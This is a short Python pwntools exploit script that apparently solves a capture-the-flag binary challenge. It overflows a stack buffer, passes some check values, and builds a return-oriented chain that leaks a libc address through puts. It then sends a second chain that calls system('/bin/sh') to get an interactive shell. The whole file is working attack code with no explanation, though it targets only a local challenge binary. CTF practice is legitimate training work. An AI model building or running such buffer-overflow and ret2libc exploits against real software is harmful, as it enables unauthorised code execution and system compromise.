from pwn import *

p = process('./chall', level="debug")
r = process('./rand')

rand = int(r.recvline()[:-1])
st_rand = str(rand)
Sum = 0
for i in range(0, len(st_rand)):
	Sum += int(st_rand[i])

r.close()

#gdb.attach(p)

p.recvuntil('Please enter your name: \n')

# gadgets:
pop_rdi = p64(0x0000000000401823)

pay = 'a'*0x28 + p64(Sum) + p64(0xc0cacede) + p64(0xfacefeed) + p64(0x183b02d47) + 'a'*0x8 + p64(0x00000000004017b3)
pay += pop_rdi
pay += p64(0x404018)# puts_got
pay += p64(0x00000000004010c0)# puts_plt
pay += p64(0x0000000000401780)# main_addr

p.sendline(pay)

out = p.recv(8)
out = u64(out[:-2].ljust(8, '\x00'))
info("leak: %s"%hex(out))

p.recvuntil('enter your name: \n')

libc_base = out - 0x875a0
system = libc_base + 0x55410
binsh = libc_base + 0x1b75aa

info("libc_base: %s"%hex(libc_base))
info("system: %s"%hex(system))
info("binsh: %s"%hex(binsh))

pay2 = 'a'*0x28 + p64(Sum) + p64(0xc0cacede) + p64(0xfacefeed) + p64(0x183b02d47) + 'b'*0x10 + p64(0x00000000004017b3)
pay2 += pop_rdi
pay2 += p64(binsh)
pay2 += p64(system)

p.clean()
p.sendline(pay2)

p.interactive()
